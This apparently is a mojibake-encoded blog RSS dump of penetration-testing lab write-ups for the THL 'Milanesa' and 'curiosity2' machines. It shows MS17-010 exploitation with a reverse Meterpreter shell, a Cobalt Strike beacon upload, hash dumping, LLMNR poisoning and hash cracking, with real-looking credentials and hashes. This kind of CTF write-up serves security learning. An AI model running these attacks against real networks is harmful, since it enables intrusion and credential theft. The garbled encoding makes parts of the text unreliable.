[*] ç½‘ç«™æ ‡é¢˜ https://20.20.20.3/dashboard/ çŠ¶æ€ç :200 é•¿åº¦:5187   æ ‡é¢˜:Welcome to XAMPP
[!] æ‰«æé”™è¯¯ 20.20.20.3:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
[!] æ‰«æé”™è¯¯ 20.20.20.6:3306 - Error 1045 (28000): Access denied for user 'mysql'@'20.20.20.7' (using password: YES)
[!] æ‰«æé”™è¯¯ 20.20.20.7:22 - æ‰«ææ€»æ—¶é—´è¶…æ—¶: context deadline exceeded
[+] æ‰«æå·²å®Œæˆ: 25/25
[*] æ‰«æç»“æŸ,è€—æ—¶: 12.122585738s


<br>æ•´ç†ä¸€ä¸‹<br>20.20.20.3  HACKME\WIN-SEUNA992K57  å¼€æ”¾ç«¯å£ 80 135 139 443 445 3306
20.20.20.4  WIN-M5KV71CEGO8 å¼€æ”¾ç«¯å£ 53 88 135 139 389 445 464 593 636 3268 3269 
20.20.20.5  Milanesa1 å¼€æ”¾ç«¯å£ 135 139 445 3389 8080
20.20.20.6  WIN-11ULVN883E8 å¼€æ”¾ç«¯å£ 80 135 139 445 3306
 
 åŸŸå hackme.thl
 DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
<br><br>fscanæ‰«æå‡ºåŸŸæ§ä¸»æœº å­˜åœ¨ms17-010<br>
å…ˆé…ç½®hosts<br>msfconsole
msf6 &gt; use exploit/windows/smb/ms17_010_psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_psexec) &gt; show options

Module options (exploit/windows/smb/ms17_010_psexec):

   Name                  Current Setting              Required  Description
   ----                  ---------------              --------  -----------
   DBGTRACE              false                        yes       Show extra debug trace info
   LEAKATTEMPTS          99                           yes       How many times to try to leak transaction
   NAMEDPIPE                                          no        A named pipe that can be connected to (leave b
                                                                lank for auto)
   NAMED_PIPES           /usr/share/metasploit-frame  yes       List of named pipes to check
                         work/data/wordlists/named_p
                         ipes.txt
   RHOSTS                                             yes       The target host(s), see https://docs.metasploi
                                                                t.com/docs/using-metasploit/basics/using-metas
                                                                ploit.html
   RPORT                 445                          yes       The Target port (TCP)
   SERVICE_DESCRIPTION                                no        Service description to be used on target for p
                                                                retty listing
   SERVICE_DISPLAY_NAME                               no        The service display name
   SERVICE_NAME                                       no        The service name
   SHARE                 ADMIN$                       yes       The share to connect to, can be an admin share
                                                                 (ADMIN$,C$,...) or a normal read/write folder
                                                                 share
   SMBDomain             .                            no        The Windows domain to use for authentication
   SMBPass                                            no        The password for the specified username
   SMBUser                                            no        The username to authenticate as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.8.96     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/ms17_010_psexec) &gt; set lhost 20.20.20.7
lhost =&gt; 20.20.20.7
msf6 exploit(windows/smb/ms17_010_psexec) &gt; set rhosts 20.20.20.4
rhosts =&gt; 20.20.20.4
msf6 exploit(windows/smb/ms17_010_psexec) &gt; run

[*] Started reverse TCP handler on 20.20.20.7:4444
[*] 20.20.20.4:445 - Target OS: Windows Server 2016 Standard 14393
[*] 20.20.20.4:445 - Built a write-what-where primitive...
[+] 20.20.20.4:445 - Overwrite complete... SYSTEM session obtained!
[*] 20.20.20.4:445 - Selecting PowerShell target
[*] 20.20.20.4:445 - Executing the payload...
[+] 20.20.20.4:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (176198 bytes) to 20.20.20.4
[*] Meterpreter session 1 opened (20.20.20.7:4444 -&gt; 20.20.20.4:49705) at 2024-12-21 00:44:46 -0500

meterpreter &gt; getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter &gt; shell
Process 1592 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
whoami
nt authority\system


c:\Users\Administrator\Documents&gt;type root_flag.txt
type root_flag.txt
{5de4808fa7cec46234dbccc6c46fa6c84}

<br>æ‹¿ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬ä¼ ä¸€ä¸ªcsçš„åé¢å¹¶è¿è¡Œã€‚æ–¹ä¾¿åç»­åˆ©ç”¨<br>meterpreter &gt; upload 3333.exe
[*] Uploading  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
[*] Uploaded 289.00 KiB of 289.00 KiB (100.0%): /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
[*] Completed  : /root/Desktop/thl/Milanesa/3333.exe -&gt; 3333.exe
meterpreter &gt; shell
Process 1596 created.
Channel 2 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.
C:\Windows\system32&gt;3333.exe
3333.exe

<br><img alt="assets/Pasted image 20241221135649.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221135649.png"><br><br>åˆ©ç”¨CSæ¨¡å—æŸ¥çœ‹ä¸€ä¸‹åŸŸå†…çš„ä¸»æœº<br>[12/21 14:01:39] [+] =========== æŸ¥è¯¢åŸŸä¸»æœº ==========
[12/21 14:01:39] [*] Tasked beacon to run: dsquery computer
[12/21 14:01:39] [+] host called home, sent: 47 bytes
[12/21 14:01:39] [+] received output:
"CN=WIN-M5KV71CEGO8,OU=Domain Controllers,DC=hackme,DC=thl"
"CN=WIN-SEUNA992K57,OU=Application,OU=Tier 1 Servers,DC=hackme,DC=thl"

<br>å¯ä»¥å‘ç°é™¤äº†DC WIN-M5KV71CEGO8 å¤– è¿˜æœ‰ä¸€å°ä¸»æœº WIN-SEUNA992K57 ä¹Ÿåœ¨åŸŸå†…<br>
WIN-SEUNA992K57å¯¹åº”çš„ipæ˜¯ 20.20.20.3 <br>å°è¯•ä½¿ç”¨åŸŸæ§çš„hashç›´æ¥è¿æ¥ è¿™å°ä¸»æœº<br><br>[12/21 14:05:00] beacon&gt; hashdump
[12/21 14:05:00] [*] Tasked beacon to dump hashes
[12/21 14:05:00] [+] host called home, sent: 82541 bytes
[12/21 14:05:01] [+] received password hashes:
Administrator:500:aad3b435b51404eeaad3b435b51404ee:6fda56fabbfce076170e240be62db1bc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8e6213105200de353a368062c3af0f94:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
adm_tier1:1128:aad3b435b51404eeaad3b435b51404ee:064dca142a74133d10a594683e6e9470:::
jenkins:1131:aad3b435b51404eeaad3b435b51404ee:cb8a428385459087a76793010d60f5dc:::
tier0_adm:1135:aad3b435b51404eeaad3b435b51404ee:b6641f2580ced2aa557daa2d1ef0aa23:::
WIN-M5KV71CEGO8$:1000:aad3b435b51404eeaad3b435b51404ee:54bebe11da7a6447eab05ed3dea7a453:::
WIN-SEUNA992K57$:1136:aad3b435b51404eeaad3b435b51404ee:5142662655fe8cce534e074112e50e1d::
<br>ç„¶åå°è¯•ä½¿ç”¨åŸŸæ§çš„HASH ç›´æ¥pth ä½†æ˜¯å‘ç°ä¸è¡Œ<br><br>å…ˆçœ‹ä¸‹ç°åœ¨çš„ä¿¡æ¯<br>20.20.20.3  HACKME\WIN-SEUNA992K57  å¼€æ”¾ç«¯å£ 80 135 139 443 445 3306
20.20.20.4 ã€å·²æ‹¿ä¸‹ã€‘ WIN-M5KV71CEGO8 å¼€æ”¾ç«¯å£ 53 88 135 139 389 445 464 593 636 3268 3269 
20.20.20.5  Milanesa1 å¼€æ”¾ç«¯å£ 135 139 445 3389 8080
20.20.20.6  WIN-11ULVN883E8 å¼€æ”¾ç«¯å£ 80 135 139 445 3306
 
 åŸŸå hackme.thl
 DC  20.20.20.4  WIN-M5KV71CEGO8.hackme.thl
<br>æˆ‘ä»¬å‘ç°å¦å¤–3ä¸ªä¸»æœºéƒ½å¼€æ”¾äº†ç½‘é¡µæœåŠ¡ã€‚<br>
å¯¹è¿™å‡ ä¸ªéƒ½è¿›è¡Œä¸€ä¸‹ç›®å½•æ‰«æ<br><br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/thl/Milanesa]
â””â”€# dirsearch -u http://20.20.20.3
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.3/_24-12-21_01-55-52.txt

Target: http://20.20.20.3/

[01:55:52] Starting:

[01:56:01] 301 -  336B  - /dashboard  -&gt;  http://20.20.20.3/dashboard/
[01:56:01] 200 -    5KB - /dashboard/
[01:56:01] 200 -   31KB - /dashboard/faq.html
[01:56:01] 200 -   80KB - /dashboard/phpinfo.php
[01:56:01] 200 -    6KB - /dashboard/howto.html
[01:56:01] 302 -    0B  - /dvwa/  -&gt;  login.php
[01:56:02] 200 -   30KB - /favicon.ico
[01:56:13] 200 -  776B  - /Webalizer/
[01:56:14] 200 -  768B  - /xampp/


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/thl/Milanesa]
â””â”€# dirsearch -u http://20.20.20.5:8080
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.5_8080/_24-12-21_01-56-22.txt

Target: http://20.20.20.5:8080/

[01:56:22] Starting:

[01:56:36] 200 -    1KB - /login.aspx


â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/thl/Milanesa]
â””â”€# dirsearch -u http://20.20.20.6
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /root/Desktop/thl/Milanesa/reports/http_20.20.20.6/_24-12-21_01-57-34.txt

Target: http://20.20.20.6/

[01:57:34] Starting:

Task Completed


<br><br>å‘ç° 20.20.20.5:8080 å­˜åœ¨ä¸€ä¸ª /login.aspx<br>
éšä¾¿è¾“å…¥è´¦å·å¯†ç å‘ç°éƒ½å¯ä»¥ç™»å½•ï¼Œè€Œä¸”ç™»å½•åéƒ½æ˜¯ä¸€ä¸ªæŠ¥é”™ç•Œé¢<br>
<img alt="assets/Pasted image 20241221150209.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221150209.png"><br>
è¿™å¯èƒ½å°±ä¸æ˜¯ä¸€ä¸ªçœŸçš„ç™»å½•æ¡†<br>
å°†æŠ¥é”™ä¿¡æ¯å‘ç»™gpt å‘Šè¯‰æˆ‘ æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„æˆ–å‘½ä»¤æ²¡æœ‰æ‰¾åˆ°<br>
<img alt="assets/Pasted image 20241221150320.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221150320.png"><br>
ç»è¿‡å°è¯•å å‘ç°è¿™é‡Œæ˜¯ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œçš„åˆ©ç”¨<br>
<img alt="assets/Pasted image 20241221150514.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221150514.png"><br>ç„¶ååœ¨ç½‘ç«™çš„æ—¥å¿—é‡Œé¢å¯ä»¥è·å–åˆ°ç”¨æˆ·çš„å¯†ç <br>
<img alt="assets/Pasted image 20241221152138.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221152138.png"><br>
/login=bubba:TuprimerP@ssword1234!<br>åˆ©ç”¨è¿™ä¸ªç”¨æˆ·å¯ä»¥rdpåˆ°ä¸»æœº 20.20.20.5<br>
ç™»å½•åéœ€è¦é‡ç½®å¯†ç  å› ä¸ºå¯†ç è¿‡æœŸäº†<br>Warning
è¿™é‡Œæ˜¯è¥¿ç­ç‰™é”®ç›˜ ï¼Œè¾“å…¥å¯†ç çš„@ä¸æ˜¯æˆ‘ä»¬æ­£å¸¸çš„é”®ç›˜è¾“å…¥çš„ã€‚ è¿™é‡Œå»ºè®®ç”¨å±å¹•é”®ç›˜è¾“å…¥å¯†ç 
<br>è¿›æ¥åæ¡Œé¢å°±æœ‰ç”¨æˆ·flag <br><img alt="assets/Pasted image 20241221152758.png" src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221152758.png">!b1ngob0ngoP0ngoUseRfl4g!#]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/8.milanesa.html</link><guid isPermaLink="false">24-æ¸—é€/THL/8.Milanesa.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Mon, 30 Dec 2024 12:59:26 GMT</pubDate><enclosure url="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221135649.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://www.c1trus.top/24-æ¸—é€/thl/assets/pasted-image-20241221135649.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[7.Pildoritas]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br>å‰§æƒ…<br>
è‘—ååˆ¶è¯å…¬å¸â€œPildoritasâ€é­é‡äº†ä¸€åœºæ¯ç­æ€§çš„ç½‘ç»œæ”»å‡»ã€‚<br>
åœ¨çœ‹ä¼¼å®‰å…¨ç¨³å›ºçš„ç¯å¢ƒä¸­ï¼Œä¸€ç¾¤é»‘å®¢æˆåŠŸä¾µå…¥äº†ä»–ä»¬çš„ç³»ç»Ÿï¼Œå°†å…¬å¸å‡ ä¹å®Œå…¨æ‘§æ¯æˆæ•°å­—åºŸå¢Ÿã€‚<br>
å…¬å¸çš„å®è´µçŸ¥è¯†ã€è®°å½•å’Œè¿è¥æ•°æ®è¦ä¹ˆè¢«åˆ é™¤ï¼Œè¦ä¹ˆè¢«åŠ å¯†ã€‚ç„¶è€Œï¼Œæ”»å‡»è€…åœ¨ç¦»å¼€æ—¶ç•™ä¸‹äº†ä¸€æ¡çº¿ç´¢â€”â€”<br>
å”¯ä¸€çš„çº¿ç´¢æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼šä¸€ä»½ä»¥ PCAP æ ¼å¼ä¿å­˜çš„ç½‘ç»œæµé‡æ•è·æ–‡ä»¶ã€‚<br>
ç°åœ¨ï¼Œâ€œPildoritasâ€çš„å‘½è¿æŒæ¡åœ¨ä½ çš„æ‰‹ä¸­ã€‚ä½ æ˜¯å¦æ‹¥æœ‰åˆ†æè¯¥æ–‡ä»¶ã€æ­ç¤ºçœŸç›¸å¹¶å¤ç°äº‹ä»¶çš„èƒ½åŠ›ï¼Ÿ
<br>]]></description><link>https://www.c1trus.top/24-æ¸—é€/thl/7.pildoritas.html</link><guid isPermaLink="false">24-æ¸—é€/THL/7.Pildoritas.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Thu, 26 Dec 2024 06:21:47 GMT</pubDate></item><item><title><![CDATA[6.curiosity2]]></title><description><![CDATA[ 
 <br><br>
<br><a data-tooltip-position="top" aria-label="1. åŸºæœ¬ä¿¡æ¯^toc" data-href="#1. åŸºæœ¬ä¿¡æ¯^toc" href="https://www.c1trus.top/about:blank#1._åŸºæœ¬ä¿¡æ¯^toc" class="internal-link" target="_self" rel="noopener nofollow">1. åŸºæœ¬ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="2. ä¿¡æ¯æ”¶é›†" data-href="#2. ä¿¡æ¯æ”¶é›†" href="https://www.c1trus.top/about:blank#2._ä¿¡æ¯æ”¶é›†" class="internal-link" target="_self" rel="noopener nofollow">2. ä¿¡æ¯æ”¶é›†</a>

<br><a data-tooltip-position="top" aria-label="2.1. ç«¯å£æ‰«æ" data-href="#2.1. ç«¯å£æ‰«æ" href="https://www.c1trus.top/about:blank#2.1._ç«¯å£æ‰«æ" class="internal-link" target="_self" rel="noopener nofollow">2.1. ç«¯å£æ‰«æ</a>
<br><a data-tooltip-position="top" aria-label="2.2. ntlmä¸­æ¯’æ”»å‡»" data-href="#2.2. ntlmä¸­æ¯’æ”»å‡»" href="https://www.c1trus.top/about:blank#2.2._ntlmä¸­æ¯’æ”»å‡»" class="internal-link" target="_self" rel="noopener nofollow">2.2. ntlmä¸­æ¯’æ”»å‡»</a>
<br><a data-tooltip-position="top" aria-label="2.3. çˆ†ç ´Hash" data-href="#2.3. çˆ†ç ´Hash" href="https://www.c1trus.top/about:blank#2.3._çˆ†ç ´Hash" class="internal-link" target="_self" rel="noopener nofollow">2.3. çˆ†ç ´Hash</a>


<br><a data-tooltip-position="top" aria-label="3. sqlcmdæ“ä½œ" data-href="#3. sqlcmdæ“ä½œ" href="https://www.c1trus.top/about:blank#3._sqlcmdæ“ä½œ" class="internal-link" target="_self" rel="noopener nofollow">3. sqlcmdæ“ä½œ</a>
<br><a data-tooltip-position="top" aria-label="4. bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ" data-href="#4. bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ" href="https://www.c1trus.top/about:blank#4._bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ" class="internal-link" target="_self" rel="noopener nofollow">4. bloodhoundåˆ†æåŸŸå†…ç¯å¢ƒ</a>
<br><a data-tooltip-position="top" aria-label="5. æ•°æ®åº“è·å–ä¿¡æ¯" data-href="#5. æ•°æ®åº“è·å–ä¿¡æ¯" href="https://www.c1trus.top/about:blank#5._æ•°æ®åº“è·å–ä¿¡æ¯" class="internal-link" target="_self" rel="noopener nofollow">5. æ•°æ®åº“è·å–ä¿¡æ¯</a>
<br><a data-tooltip-position="top" aria-label="6. å¯†ç å–·æ¶‚" data-href="#6. å¯†ç å–·æ¶‚" href="https://www.c1trus.top/about:blank#6._å¯†ç å–·æ¶‚" class="internal-link" target="_self" rel="noopener nofollow">6. å¯†ç å–·æ¶‚</a>
<br><a data-tooltip-position="top" aria-label="7. ç ´è§£kdbxæ•°æ®åº“æ–‡ä»¶" data-href="#7. ç ´è§£kdbxæ•°æ®åº“æ–‡ä»¶" href="https://www.c1trus.top/about:blank#7._ç ´è§£kdbxæ•°æ®åº“æ–‡ä»¶" class="internal-link" target="_self" rel="noopener nofollow">7. ç ´è§£kdbxæ•°æ®åº“æ–‡ä»¶</a>
<br><a data-tooltip-position="top" aria-label="8. DCSync" data-href="#8. DCSync" href="https://www.c1trus.top/about:blank#8._DCSync" class="internal-link" target="_self" rel="noopener nofollow">8. DCSync</a><br>
é¶æœºé“¾æ¥<br>
éš¾åº¦ â­ï¸â­ï¸â­ï¸â­ï¸â­ï¸
<br><br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# fscan -h 192.168.56.116

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _`' |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.4
start infoscan
192.168.56.116:135 open
192.168.56.116:139 open
192.168.56.116:445 open
192.168.56.116:88 open
[*] alive ports len is: 4
start vulscan
[*] NetBios 192.168.56.116  [+] DC:CONS\WIN-C73PROQLRHL
[*] NetInfo
[*]192.168.56.116
   [-&gt;]WIN-C73PROQLRHL
   [-&gt;]192.168.56.116
   [-&gt;]10.16.41.51
   [-&gt;]2409:8760:1e81:10::39d9
å·²å®Œæˆ 4/4
[*] æ‰«æç»“æŸ,è€—æ—¶: 2.092922428s

â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# nmap -sCV 192.168.56.116
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 17:57 CST
Nmap scan report for 192.168.56.116
Host is up (0.00029s latency).
Not shown: 990 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-12-10 16:57:42Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cons.thl, Site: Default-First-Site-Name)
|_ssl-date: 2024-12-10T16:58:30+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: commonName=WIN-C73PROQLRHL.cons.thl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:WIN-C73PROQLRHL.cons.thl
| Not valid before: 2024-10-11T16:05:23
|_Not valid after:  2025-10-11T16:05:23
MAC Address: 08:00:27:C1:EE:2F (Oracle VirtualBox virtual NIC)
Service Info: Host: WIN-C73PROQLRHL; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_nbstat: NetBIOS name: WIN-C73PROQLRHL, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:c1:ee:2f (Oracle VirtualBox virtual NIC)
| smb2-time:
|   date: 2024-12-10T16:58:21
|_  start_date: 2024-12-10T16:56:53
|_clock-skew: mean: 6h59m58s, deviation: 0s, median: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 73.57 seconds

<br><br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# responder -I eth0


[SMB] NTLMv2-SSP Client   : fe80::e880:b43a:2756:c900
[SMB] NTLMv2-SSP Username : cons\Appolonia
[SMB] NTLMv2-SSP Hash     : Appolonia::cons:49ad08d5b95f487e:7981C671B6509FFED9036CB51727F74D:010100000000000080A60B552D4BDB01CEC743A0ED3C72F20000000002000800380035005200410001001E00570049004E002D0054004B005A00410054004A0045004C0049003200440004003400570049004E002D0054004B005A00410054004A0045004C004900320044002E0038003500520041002E004C004F00430041004C000300140038003500520041002E004C004F00430041004C000500140038003500520041002E004C004F00430041004C000700080080A60B552D4BDB0106000400020000000800300030000000000000000000000000400000F8AC0EC0C53E58EC88B9F6134D5F79AEA985E41E98EE06169DEB1E85F052D0610A0010000000000000000000000000000000000009001C0063006900660073002F00530051004C00730065007200760065007200000000000000000000000000
[*] [NBT-NS] Poisoned answer sent to 192.168.56.116 for name SQLDATABABASE (service: File Server)
[*] [LLMNR]  Poisoned answer sent to fe80::e880:b43a:2756:c900 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to fe80::e880:b43a:2756:c900 for name SQLDatababase
[*] [LLMNR]  Poisoned answer sent to 192.168.56.116 for name SQLDatababase
[SMB] NTLMv2-SSP Client   : fe80::e880:b43a:2756:c900
[SMB] NTLMv2-SSP Username : cons\sqldb
[SMB] NTLMv2-SSP Hash     : sqldb::cons:d7ed9707c16853ff:95D5F1D9D93D1C77A5C6B4E03B2BACDC:010100000000000080A60B552D4BDB017F14781EF42811660000000002000800380035005200410001001E00570049004E002D0054004B005A00410054004A0045004C0049003200440004003400570049004E002D0054004B005A00410054004A0045004C004900320044002E0038003500520041002E004C004F00430041004C000300140038003500520041002E004C004F00430041004C000500140038003500520041002E004C004F00430041004C000700080080A60B552D4BDB0106000400020000000800300030000000000000000000000000400000F8AC0EC0C53E58EC88B9F6134D5F79AEA985E41E98EE06169DEB1E85F052D0610A001000000000000000000000000000000000000900240063006900660073002F00530051004C004400610074006100620061006200610073006500000000000000000000000000

<br><br>
æ ¹æ®è¿™ä¸ªä½œè€…çš„ä¹ æƒ¯ã€‚rockyouä¸€èˆ¬éƒ½æ˜¯çˆ†ç ´ä¸å‡ºæ¥çš„<br>
æ¢ä¸€ä¸ªå­—å…¸çˆ†ç ´
<br>â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/thl/curiosity2]
â””â”€# hashcat -a 0 -m 5600 appolonia_ntlmv2.txt /usr/share/wordlists/seclists/Passwords/seasons.txt
APPOLONIA::cons:49ad08d5b95f487e:7981c671b6509ffed9036cb51727f74d:010100000000000080a60b552d4bdb01cec743a0ed3c72f20000000002000800380035005200410001001e00570049004e002d0054004b005a00410054004a0045004c0049003200440004003400570049004e002d0054004b005a00410054004a0045004c004900320044002e0038003500520041002e004c004f00430041004c000300140038003500520041002e004c004f00430041004c000500140038003500520041002e004c004f00430041004c000700080080a60b552d4bdb0106000400020000000800300030000000000000000000000000400000f8ac0ec0c53e58ec88b9f6134d5f79aea985e41e98ee06169deb1e85f052d0610a0010000000000000000000000000000000000009001c0063006900660073002f00530051004c00730065007200760065007200000000000000000000000000:5umm3r@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: APPOLONIA::cons:49ad08d5b95f487e:7981c671b6509ffed9...000000
Time.Started.....: Mon Dec 16 16:25:24 2024 (0 secs)
Time.Estimated...: Mon Dec 16 16:25:24 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  1764.7 kH/s (1.11ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 4096/5390 (75.99%)
Rejected.........: 0/4096 (0.00%)
Restore.Point....: 0/5390 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: $pr1ng -&gt; W1NT3R2021@
Hardware.Mon.#1..: Util: 12%

Started: Mon Dec 16 16:25:23 2024
Stopped: Mon Dec 16 16:25:25 2024



SQLDB::cons:d7ed9707c16853ff:95d5f1d9d93d1c77a5c6b4e03b2bacdc:010100000000000080a60b552d4bdb017f14781ef42811660000000002000800380035005200410001001e00570049004e002d0054004b005a00410054004a0045004c0049003200440004003400570049004e002d0054004b005a00410054004a0045004c004900320044002e0038003500520041002e004c004f00430041004c000300140038003500520041002e004c004f00430041004c000500140038003500520041002e004c004f00430041004c000700080080a60b552d4bdb0106000400020000000800300030000000000000000000000000400000f8ac0ec0c53e58ec88b9f6134d5f79aea985e41e98ee06169deb1e85f052d0610a001000000000000000000000000000000000000900240063006900660073002f00530051004c004400610074006100620061006200610073006500000000000000000000000000:au7umn@

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 5600 (NetNTLMv2)
Hash.Target......: SQLDB::cons:d7ed9707c16853ff:95d5f1d9d93d1c77a5c6b4...000000
Time.Started.....: Mon Dec 16 16:26:39 2024 (0 secs)
Time.Estimated...: Mon Dec 16 16:26:39 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/seclists/Passwords/seasons.txt)
